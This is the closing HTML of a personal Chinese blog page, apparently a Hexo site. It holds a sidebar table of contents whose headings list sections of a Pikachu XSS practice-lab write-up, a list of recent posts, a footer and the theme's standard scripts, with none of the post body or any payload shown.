fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E5%8F%8D%E5%B0%84%E5%9E%8BXSS-get"><span class="toc-number">1.</span> <span class="toc-text">1.反射型XSS(get)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E5%8F%8D%E5%B0%84%E5%9E%8BXSS-post"><span class="toc-number">2.</span> <span class="toc-text">2.反射型XSS(post)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E5%AD%98%E5%82%A8%E5%9E%8BXSS"><span class="toc-number">3.</span> <span class="toc-text">3.存储型XSS</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-DOM%E5%9E%8BXSS"><span class="toc-number">4.</span> <span class="toc-text">4.DOM型XSS</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-DOM%E5%9E%8BXSS-X"><span class="toc-number">5.</span> <span class="toc-text">5.DOM型XSS-X</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#6-XSS%E4%B9%8B%E7%9B%B2%E6%89%93"><span class="toc-number">6.</span> <span class="toc-text">6.XSS之盲打</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#7-XSS%E4%B9%8B%E8%BF%87%E6%BB%A4"><span class="toc-number">7.</span> <span class="toc-text">7.XSS之过滤</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#8-xss%E4%B9%8Bhtmlspecialchars"><span class="toc-number">8.</span> <span class="toc-text">8.xss之htmlspecialchars</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#9-xss%E4%B9%8Bhref%E8%BE%93%E5%87%BA"><span class="toc-number">9.</span> <span class="toc-text">9.xss之href输出</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#10-xss%E4%B9%8Bjs%E8%BE%93%E5%87%BA"><span class="toc-number">10.</span> <span class="toc-text">10.xss之js输出</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/05/15/XSS/" title="XSS靶场四种类型"><img src="https://img0.baidu.com/it/u=3774379887,1875053821&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=500&amp;h=889" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="XSS靶场四种类型"/></a><div class="content"><a class="title" href="/2022/05/15/XSS/" title="XSS靶场四种类型">XSS靶场四种类型</a><time datetime="2022-05-15T09:32:34.000Z" title="发表于 2022-05-15 17:32:34">2022-05-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/05/15/%E4%B8%BB%E9%A2%98%E4%BB%A3%E7%A0%81%E5%9D%97/%E6%BC%94%E7%A4%BA/" title="靶场心得"><img src="/./img/xueren.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="靶场心得"/></a><div class="content"><a class="title" href="/2022/05/15/%E4%B8%BB%E9%A2%98%E4%BB%A3%E7%A0%81%E5%9D%97/%E6%BC%94%E7%A4%BA/" title="靶场心得">靶场心得</a><time datetime="2022-05-15T08:30:00.000Z" title="发表于 2022-05-15 16:30:00">2022-05-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/05/15/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" title="pikichu暴力破解"><img src="https://img2.baidu.com/it/u=1893462964,3580788311&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=500&amp;h=619" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pikichu暴力破解"/></a><div class="content"><a class="title" href="/2022/05/15/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" title="pikichu暴力破解">pikichu暴力破解</a><time datetime="2022-05-14T20:35:15.000Z" title="发表于 2022-05-15 04:35:15">2022-05-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/05/13/hello-world/" title="Hello World"><img src="https://pics3.baidu.com/feed/f2deb48f8c5494ee7cd619bf8d27a5f99b257efd.jpeg?token=b7553459549d6df4b7b4fd4dc35eaacc" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hello World"/></a><div class="content"><a class="title" href="/2022/05/13/hello-world/" title="Hello World">Hello World</a><time datetime="2022-05-13T07:12:18.375Z" title="发表于 2022-05-13 15:12:18">2022-05-13</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By 郭胧演</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
